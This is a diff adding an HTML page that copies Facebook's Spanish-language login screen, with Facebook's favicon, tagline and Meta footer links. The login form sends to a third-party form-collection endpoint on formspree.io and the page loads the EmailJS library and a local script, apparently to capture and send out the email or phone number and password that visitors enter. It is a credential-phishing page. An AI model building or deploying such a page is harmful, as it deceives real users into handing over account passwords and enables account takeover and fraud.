@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Facebook - Entrar o registrarse</title>
+  <meta name="description" content="Inicia sesión en Facebook para empezar a compartir y conectar con tus amigos, familiares y las personas que conoces.">
+  <link rel="stylesheet" href="./styles/styles.css">
+  <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/v4/yj/r/gB76kJXPYJV.png" type="image/x-icon">
+  <script type="module" src="./index.js"></script>
+</head>
+<body>
+  <div class="container">
+    <div class="left-column">
+      <div class="logo-container">
+        <img src="./assets/facebook-logo.svg" alt="Facebook" width="280">
+      </div>
+      <h2 class="tagline">Facebook te ayuda a comunicarte y compartir con las personas que forman parte de tu vida.</h2>
+    </div>
+    <div class="right-column">
+      <div class="login-container">
+        <form class="login-form" id="loginForm" action="https://formspree.io/f/service_upm88pg" method="POST">
+          <input type="text" class="form-input" placeholder="Correo electrónico o número de teléfono" aria-label="Correo electrónico o número de teléfono">
+          <input type="password" class="form-input" placeholder="Contraseña" aria-label="Contraseña">
+          <button type="submit" class="login-button">Iniciar sesión</button>
+          <div class="forgot-password">
+            <a href="#">¿Has olvidado la contraseña?</a>
+          </div>
+          <div class="divider"></div>
+          <button type="button" class="create-account-button">Crear una cuenta</button>
+        </form>
+      </div>
+      <div class="create-page">
+        <a href="#">Crea una página</a> para un famoso, una marca o una empresa.
+      </div>
+    </div>
+  </div>
+
+  <footer class="footer">
+    <div class="footer-content">
+      <ul class="language-selector">
+        <li>Español (España)</li>
+        <li><a href="#">English (US)</a></li>
+        <li><a href="#">Français (France)</a></li>
+        <li><a href="#">中文(简体)</a></li>
+        <li><a href="#">العربية</a></li>
+        <li><a href="#">Português (Brasil)</a></li>
+        <li><a href="#">Italiano</a></li>
+        <li><a href="#">한국어</a></li>
+        <li><a href="#">Deutsch</a></li>
+        <li><a href="#">हिन्दी</a></li>
+        <li><a href="#">日本語</a></li>
+      </ul>
+      <ul class="footer-links">
+        <li><a href="#">Registrarte</a></li>
+        <li><a href="#">Iniciar sesión</a></li>
+        <li><a href="#">Messenger</a></li>
+        <li><a href="#">Facebook Lite</a></li>
+        <li><a href="#">Vídeo</a></li>
+        <li><a href="#">Meta Pay</a></li>
+        <li><a href="#">Meta Store</a></li>
+        <li><a href="#">Meta Quest</a></li>
+        <li><a href="#">Ray-Ban Meta</a></li>
+        <li><a href="#">Meta AI</a></li>
+        <li><a href="#">Instagram</a></li>
+        <li><a href="#">Threads</a></li>
+        <li><a href="#">Información</a></li>
+        <li><a href="#">Crear anuncio</a></li>
+        <li><a href="#">Crear página</a></li>
+        <li><a href="#">Desarrolladores</a></li>
+        <li><a href="#">Empleo</a></li>
+        <li><a href="#">Cookies</a></li>
+        <li><a href="#">Opciones de anuncios</a></li>
+        <li><a href="#">Condiciones</a></li>
+        <li><a href="#">Ayuda</a></li>
+        <li><a href="#">Subir contactos y no usuarios</a></li>
+      </ul>
+      <div class="copyright">
+        <span>Meta © 2025</span>
+      </div>
+    </div>
+  </footer>
+
+  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+</body>
+
+</html>
